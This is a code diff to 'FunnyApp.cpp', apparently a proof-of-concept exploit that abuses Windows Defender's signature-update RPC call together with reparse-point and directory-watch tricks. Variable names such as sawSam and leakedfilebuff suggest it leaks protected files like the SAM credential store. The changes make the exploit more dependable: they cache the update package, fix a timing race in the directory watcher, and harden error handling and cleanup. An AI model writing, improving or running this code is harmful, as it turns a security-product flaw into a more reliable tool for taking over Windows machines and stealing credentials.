@@ -1,0 +1,498 @@
+diff --git a/FunnyApp.cpp b/FunnyApp.cpp
+index 531aeaf..4b8fadb 100644
+--- a/FunnyApp.cpp
++++ b/FunnyApp.cpp
+@@ -43,6 +43,8 @@
+ #pragma comment(lib, "Wuguid.lib")
+ #pragma comment(lib,"CldApi.lib")
+ 
++static void LogV(const char* fmt, ...);
++
+ 
+ /// NT routines and definitions
+ HMODULE hm = GetModuleHandle(L"ntdll.dll");
+@@ -140,9 +142,9 @@ typedef struct _REPARSE_DATA_BUFFER {
+ // definitions of structures used by threads that invoke WD RPC calls
+ struct WDRPCWorkerThreadArgs
+ {
+-	HANDLE hntfythread;
+ 	HANDLE hevent;
+ 	RPC_STATUS res;
++	error_status_t serverstatus;
+ 	wchar_t* dirpath;
+ };
+ 
+@@ -244,40 +246,26 @@ void __RPC_USER midl_user_free(void __RPC_FAR* p)
+ //////////////////////////////////////////////////////////////////////
+ // WD RPC functions
+ /////////////////////////////////////////////////////////////////////
+-void ThrowFunc()
+-{
+-	throw 0;
+-}
+-
+-void RaiseExceptionInThread(HANDLE hthread)
+-{
+-	CONTEXT ctx = { 0 };
+-	ctx.ContextFlags = CONTEXT_FULL;
+-	SuspendThread(hthread);
+-
+-	if (GetThreadContext(hthread, &ctx))
+-	{
+-		ctx.Rip = (DWORD64)ThrowFunc;
+-		SetThreadContext(hthread, &ctx);
+-		ResumeThread(hthread);
+-	}
+-}
+-
+ void CallWD(WDRPCWorkerThreadArgs* args)
+ {
+ 	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
+-	RPC_WSTR StringBinding;
+-	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
++	RPC_WSTR StringBinding = NULL;
++	RPC_STATUS rpcres = RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding);
++	if (rpcres != RPC_S_OK)
+ 	{
+-		//printf("Unexpected error while building an RPC binding from string !!!");
+-		RaiseExceptionInThread(args->hntfythread);
++		args->res = rpcres;
++		if (args->hevent)
++			SetEvent(args->hevent);
+ 		return;
+ 	}
+ 	RPC_BINDING_HANDLE bindhandle = 0;
+-	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
++	rpcres = RpcBindingFromStringBindingW(StringBinding, &bindhandle);
++	RpcStringFreeW(&StringBinding);
++	if (rpcres != RPC_S_OK)
+ 	{
+-		//printf("Failed to connect to windows defender RPC port !!!");
+-		RaiseExceptionInThread(args->hntfythread);
++		args->res = rpcres;
++		if (args->hevent)
++			SetEvent(args->hevent);
+ 		return;
+ 	}
+ 	// PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update.
+@@ -285,6 +273,8 @@ void CallWD(WDRPCWorkerThreadArgs* args)
+ 	//printf("Calling ServerMpUpdateEngineSignature...\n");
+ 	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
+ 	args->res = stat;
++	args->serverstatus = errstat;
++	RpcBindingFree(&bindhandle);
+ 	if (args->hevent)
+ 		SetEvent(args->hevent);
+ 
+@@ -596,6 +586,116 @@ void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* ca
+ 
+ }
+ 
++static const wchar_t UPDATE_CACHE_NAME[] = L"mpam-fe-x64.exe";
++
++static bool BuildUpdateCachePath(wchar_t* cachepath, DWORD cachechars)
++{
++	DWORD len = GetModuleFileNameW(NULL, cachepath, cachechars);
++	if (!len || len >= cachechars)
++		return false;
++
++	wchar_t* slash = wcsrchr(cachepath, L'\\');
++	if (!slash)
++		return false;
++	slash[1] = L'\0';
++
++	if (wcslen(cachepath) + wcslen(UPDATE_CACHE_NAME) + 1 > cachechars)
++		return false;
++	wcscat(cachepath, UPDATE_CACHE_NAME);
++	return true;
++}
++
++static bool ReadUpdateCache(const wchar_t* cachepath, void** outbuff, DWORD* outsize)
++{
++	HANDLE file = CreateFileW(cachepath, GENERIC_READ, FILE_SHARE_READ, NULL,
++		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
++	if (file == INVALID_HANDLE_VALUE)
++		return false;
++
++	LARGE_INTEGER size = { 0 };
++	if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0 || size.QuadPart > MAXDWORD)
++	{
++		CloseHandle(file);
++		return false;
++	}
++
++	DWORD total = (DWORD)size.QuadPart;
++	BYTE* data = (BYTE*)malloc(total);
++	if (!data)
++	{
++		CloseHandle(file);
++		return false;
++	}
++
++	DWORD done = 0;
++	while (done < total)
++	{
++		DWORD remaining = total - done;
++		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
++		DWORD got = 0;
++		if (!ReadFile(file, data + done, chunk, &got, NULL) || !got)
++		{
++			free(data);
++			CloseHandle(file);
++			return false;
++		}
++		done += got;
++	}
++
++	CloseHandle(file);
++	*outbuff = data;
++	*outsize = total;
++	return true;
++}
++
++static bool WriteUpdateCache(const wchar_t* cachepath, const void* buff, DWORD size)
++{
++	wchar_t temppath[MAX_PATH] = { 0 };
++	if (wcslen(cachepath) + 5 > MAX_PATH)
++	{
++		SetLastError(ERROR_BUFFER_OVERFLOW);
++		return false;
++	}
++	wsprintfW(temppath, L"%s.tmp", cachepath);
++
++	HANDLE file = CreateFileW(temppath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
++		FILE_ATTRIBUTE_NORMAL, NULL);
++	if (file == INVALID_HANDLE_VALUE)
++		return false;
++
++	const BYTE* data = (const BYTE*)buff;
++	DWORD done = 0;
++	DWORD saveerror = ERROR_SUCCESS;
++	while (done < size)
++	{
++		DWORD remaining = size - done;
++		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
++		DWORD written = 0;
++		if (!WriteFile(file, data + done, chunk, &written, NULL) || !written)
++		{
++			saveerror = GetLastError();
++			break;
++		}
++		done += written;
++	}
++
++	if (saveerror == ERROR_SUCCESS && !FlushFileBuffers(file))
++		saveerror = GetLastError();
++	CloseHandle(file);
++
++	if (saveerror == ERROR_SUCCESS && !MoveFileExW(temppath, cachepath,
++		MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
++		saveerror = GetLastError();
++
++	if (saveerror != ERROR_SUCCESS)
++	{
++		DeleteFileW(temppath);
++		SetLastError(saveerror);
++		return false;
++	}
++	return true;
++}
++
+ 
+ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
+ {
+@@ -636,57 +736,59 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
+ 	char** filesmtrx = 0;
+ 	UpdateFiles* firstupdt = NULL;
+ 	UpdateFiles* current = NULL;
++	wchar_t cachepath[MAX_PATH] = { 0 };
++	bool havecachepath = BuildUpdateCachePath(cachepath, MAX_PATH);
++	bool loadedfromcache = false;
+ 
+ 	DWORD nbytes = 0;
+ 
+ 
+-	//printf("Downloading updates...\n");
+-	hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+-	if (!hint)
++	if (havecachepath && ReadUpdateCache(cachepath, &exebuff, &sz))
+ 	{
+-		//printf("Failed to open internet, error : %d", GetLastError());
+-		goto cleanup;
++		loadedfromcache = true;
++		LogV("Using cached update package: %ws (%lu bytes)\n", cachepath, sz);
+ 	}
+-
+-	hint2 = InternetOpenUrl(hint, L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64", NULL, NULL, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
+-	//InternetCloseHandle(hint);
+-	if (!hint2)
++	else
+ 	{
+-		//printf("Failed to open internet URL, error : %d", GetLastError());
+-		goto cleanup;
+-	}
++		if (havecachepath && GetFileAttributesW(cachepath) != INVALID_FILE_ATTRIBUTES)
++			LogV("Cached package could not be read; downloading a fresh copy.\n");
+ 
+-	res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
+-	if (!res2)
+-	{
+-		//printf("Failed to query update size, error : %d", GetLastError());
+-		goto cleanup;
+-	}
++		LogV("Downloading update package from Microsoft CDN...\n");
++		hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
++		if (!hint)
++			goto cleanup;
+ 
++		hint2 = InternetOpenUrl(hint, L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64", NULL, NULL, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
++		if (!hint2)
++			goto cleanup;
+ 
+-	wcscpy(filesz, (LPWSTR)data);
+-	sz = _wtoi(filesz);
+-	li.QuadPart = sz;
++		res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
++		if (!res2)
++			goto cleanup;
+ 
++		wcscpy(filesz, (LPWSTR)data);
++		sz = _wtoi(filesz);
++		li.QuadPart = sz;
+ 
+-	exebuff = malloc(sz);
+-	if (!exebuff)
+-	{
+-		//printf("Failed to allocate memory to download file !!!");
+-		goto cleanup;
+-	}
+-	ZeroMemory(exebuff, sz);
++		exebuff = malloc(sz);
++		if (!exebuff)
++			goto cleanup;
++		ZeroMemory(exebuff, sz);
+ 
+-	if (!InternetReadFile(hint2, exebuff, sz, &readsz) || readsz != sz)
+-	{
++		readsz = 0;
++		while (readsz < sz)
++		{
++			DWORD got = 0;
++			if (!InternetReadFile(hint2, (BYTE*)exebuff + readsz, sz - readsz, &got) || !got)
++				goto cleanup;
++			readsz += got;
++		}
+ 
+-		//printf("Failed to download update from internet, error : %d", GetLastError());
+-		goto cleanup;
++		InternetCloseHandle(hint);
++		hint = NULL;
++		InternetCloseHandle(hint2);
++		hint2 = NULL;
+ 	}
+-	InternetCloseHandle(hint);
+-	hint = NULL;
+-	InternetCloseHandle(hint2);
+-	hint2 = NULL;
+ 	//printf("Done.\n");
+ 	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);
+ 
+@@ -721,6 +823,13 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
+ 		//printf("Failed to extract cab file, error : 0x%x", erfstruct.erfOper);
+ 		goto cleanup;
+ 	}
++	if (!loadedfromcache && havecachepath)
++	{
++		if (WriteUpdateCache(cachepath, exebuff, sz))
++			LogV("Saved update package cache: %ws\n", cachepath);
++		else
++			LogV("Could not save update cache (continuing), error: %lu\n", GetLastError());
++	}
+ 	FDIDestroy(hcabctx);
+ 	hcabctx = NULL;
+ 
+@@ -3239,7 +3348,6 @@ int wmain(int argc, wchar_t* argv[])
+ 	DWORD tid = 0;
+ 	HANDLE hthread = NULL;
+ 	WDRPCWorkerThreadArgs threadargs = { 0 };
+-	HANDLE hcurrentthread = NULL;
+ 	HANDLE hdir = NULL;
+ 	wchar_t newdefupdatedirname[MAX_PATH] = { 0 };
+ 	wchar_t updatelibpath[MAX_PATH] = { 0 };
+@@ -3287,6 +3395,7 @@ int wmain(int argc, wchar_t* argv[])
+ 	bool isvssready = false;
+ 	bool criterr = false;
+ 	bool sawSam = false;
++	int processresult = 1;
+ 
+ 
+ 	try {
+@@ -3387,16 +3496,13 @@ int wmain(int argc, wchar_t* argv[])
+ 				goto cleanup;
+ 			}
+ 
+-			hcurrentthread = OpenThread(THREAD_ALL_ACCESS, NULL, GetCurrentThreadId());
+-			if (!hcurrentthread)
++			threadargs.dirpath = updatepath;
++			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
++			if (!threadargs.hevent)
+ 			{
+-				//printf("Unexpected error while opening current thread, error : %d", GetLastError());
++				LogV("CreateEvent for Defender RPC worker failed: %lu\n", GetLastError());
+ 				goto cleanup;
+ 			}
+-			threadargs.dirpath = updatepath;
+-			threadargs.hntfythread = hcurrentthread;
+-			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
+-			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
+ 
+ 			LogV("Waiting for windows defender to create a new definition update directory...\n");
+ 			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
+@@ -3404,20 +3510,96 @@ int wmain(int argc, wchar_t* argv[])
+ 				ZeroMemory(buff, sizeof(buff));
+ 				OVERLAPPED od = { 0 };
+ 				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+-				ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
++				if (!od.hEvent)
++				{
++					LogV("CreateEvent for directory watcher failed: %lu\n", GetLastError());
++					goto cleanup;
++				}
++
++				BOOL watchstarted = ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE,
++					FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
++				DWORD watcherror = watchstarted ? ERROR_SUCCESS : GetLastError();
++				if (!watchstarted && watcherror != ERROR_IO_PENDING)
++				{
++					LogV("ReadDirectoryChangesW failed: %lu\n", watcherror);
++					CloseHandle(od.hEvent);
++					goto cleanup;
++				}
++
++				// Arm the directory watcher before dispatching the RPC. Starting the
++				// worker first can miss a fast directory creation and look like an
++				// unexplained process exit when the RPC event wins the wait.
++				if (!hthread)
++				{
++					hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
++					if (!hthread)
++					{
++						DWORD threaderror = GetLastError();
++						CancelIo(hdir);
++						GetOverlappedResult(hdir, &od, &retbytes, TRUE);
++						CloseHandle(od.hEvent);
++						LogV("CreateThread for Defender RPC worker failed: %lu\n", threaderror);
++						goto cleanup;
++					}
++				}
++
+ 				HANDLE events[2] = { od.hEvent, threadargs.hevent };
+-				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
++				DWORD waitresult = WaitForMultipleObjects(2, events, FALSE, INFINITE);
++				if (waitresult == WAIT_OBJECT_0 + 1)
+ 				{
+-					//printf("ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
++					CancelIo(hdir);
++					GetOverlappedResult(hdir, &od, &retbytes, TRUE);
++					CloseHandle(od.hEvent);
++					LogV("Defender RPC ended before a definition directory was created: return=0x%08lX, server_status=0x%08lX\n",
++						(unsigned long)threadargs.res, (unsigned long)threadargs.serverstatus);
++					goto cleanup;
++				}
++				if (waitresult != WAIT_OBJECT_0)
++				{
++					DWORD waiterror = GetLastError();
++					CancelIo(hdir);
++					GetOverlappedResult(hdir, &od, &retbytes, TRUE);
++					CloseHandle(od.hEvent);
++					LogV("WaitForMultipleObjects failed: result=0x%08lX, error=%lu\n",
++						(unsigned long)waitresult, (unsigned long)waiterror);
++					goto cleanup;
++				}
++
++				if (!GetOverlappedResult(hdir, &od, &retbytes, FALSE))
++				{
++					DWORD resultError = GetLastError();
++					CloseHandle(od.hEvent);
++					LogV("Directory notification completion failed: %lu\n", resultError);
+ 					goto cleanup;
+ 				}
+ 				CloseHandle(od.hEvent);
+ 
+ 				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
+-				if (pfni->Action != FILE_ACTION_ADDED)
++				PFILE_NOTIFY_INFORMATION added = NULL;
++				for (;;)
++				{
++					if (pfni->Action == FILE_ACTION_ADDED)
++					{
++						added = pfni;
++						break;
++					}
++					if (!pfni->NextEntryOffset)
++						break;
++					pfni = (PFILE_NOTIFY_INFORMATION)((BYTE*)pfni + pfni->NextEntryOffset);
++				}
++				if (!added)
+ 					continue;
+ 
+-				wcscat(newdefupdatedirname, pfni->FileName);
++				size_t basenamechars = wcslen(newdefupdatedirname);
++				size_t addedchars = added->FileNameLength / sizeof(wchar_t);
++				if (basenamechars + addedchars >= MAX_PATH)
++				{
++					LogV("Definition update directory name is too long.\n");
++					goto cleanup;
++				}
++				memcpy(newdefupdatedirname + basenamechars, added->FileName,
++					addedchars * sizeof(wchar_t));
++				newdefupdatedirname[basenamechars + addedchars] = L'\0';
+ 				break;
+ 			} while (1);
+ 			LogV("Detected new definition update directory in %ws\n", newdefupdatedirname);
+@@ -3692,6 +3874,9 @@ int wmain(int argc, wchar_t* argv[])
+ 			WaitForSingleObject(hthread, INFINITE);
+ 			CloseHandle(hthread);
+ 			hthread = NULL;
++			CloseHandle(threadargs.hevent);
++			threadargs.hevent = NULL;
++			processresult = 0;
+ 
+ 
+ 			
+@@ -3704,6 +3889,17 @@ int wmain(int argc, wchar_t* argv[])
+ 	}
+ 
+ cleanup:
++	if (hthread)
++	{
++		WaitForSingleObject(hthread, 5000);
++		CloseHandle(hthread);
++		hthread = NULL;
++	}
++	if (threadargs.hevent)
++	{
++		CloseHandle(threadargs.hevent);
++		threadargs.hevent = NULL;
++	}
+ 
+ 	if(hint)
+ 		InternetCloseHandle(hint);
+@@ -3740,8 +3936,6 @@ cleanup:
+ 		free(leakedfilebuff);
+ 	for (int ci = 0; ci < 3; ci++)
+ 		if (hobjlinks[ci]) { CloseHandle(hobjlinks[ci]); hobjlinks[ci] = NULL; }
+-	if (hcurrentthread)
+-		CloseHandle(hcurrentthread);
+ 	if (needupdatedircleanup)
+ 	{
+ 		wchar_t dirtoclean[MAX_PATH] = { 0 };
+@@ -3766,7 +3960,7 @@ cleanup:
+ 	}
+ 
+ 
+-	return 0;
++	return processresult;
+ }
+ 
+ 
